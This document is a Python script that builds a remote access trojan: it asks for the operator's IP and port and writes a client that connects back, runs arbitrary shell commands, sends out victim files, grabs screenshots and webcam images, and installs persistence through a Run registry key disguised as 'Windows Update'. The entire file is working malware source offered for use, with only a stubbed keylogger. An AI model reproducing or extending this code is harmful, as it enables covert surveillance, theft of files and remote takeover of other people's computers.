import base64

def build_rat(ip, port):
    template = f"""
import socket
import subprocess
import os
import threading
import base64

SERVER_IP = "{ip}"
SERVER_PORT = {port}

def connect():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))

            while True:
                command = client.recv(1024).decode()
                if command == "screenshot":
                    take_screenshot(client)
                elif command == "keylogger":
                    start_keylogger(client)
                elif command == "cam_snap":
                    take_cam_snap(client)
                elif command == "persistence":
                    create_persistence()
                elif command.startswith("upload"):
                    upload_file(client, command)
                elif command.startswith("download"):
                    download_file(client, command)
                elif command == "exit":
                    client.close()
                    break
                else:
                    execute_command(client, command)
        except:
            pass

def execute_command(client, command):
    output = subprocess.getoutput(command)
    client.send(output.encode())

def upload_file(client, command):
    path = command.split(" ", 1)[1]
    with open(path, "rb") as f:
        client.send(base64.b64encode(f.read()))

def download_file(client, command):
    filename = command.split(" ", 1)[1]
    data = client.recv(999999)
    with open(filename, "wb") as f:
        f.write(base64.b64decode(data))

def take_screenshot(client):
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")
        with open("screen.png", "rb") as f:
            client.send(base64.b64encode(f.read()))
        os.remove("screen.png")
    except:
        client.send(b"Failed to take screenshot.")

def start_keylogger(client):
    client.send(b"Keylogger started (not implemented).")  # بعدا تکمیل میشه

def take_cam_snap(client):
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("cam.jpg", frame)
            with open("cam.jpg", "rb") as f:
                client.send(base64.b64encode(f.read()))
            os.remove("cam.jpg")
        cam.release()
    except:
        client.send(b"Failed to access camera.")

def create_persistence():
    try:
        import shutil
        import winreg as reg
        path = os.environ["APPDATA"] + "\\WindowsExplorer.exe"
        if not os.path.exists(path):
            shutil.copyfile(sys.argv[0], path)
            key = reg.HKEY_CURRENT_USER
            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, "Windows Update", 0, reg.REG_SZ, path)
            reg.CloseKey(open_key)
    except:
        pass

connect()
    """

    with open("rat_output.py", "w") as f:
        f.write(template)

    print("[+] file is done -> rat_output.py")

if __name__ == "__main__":
    ip = input("give me your ip: ")
    port = int(input("port plz: "))
    build_rat(ip, port)
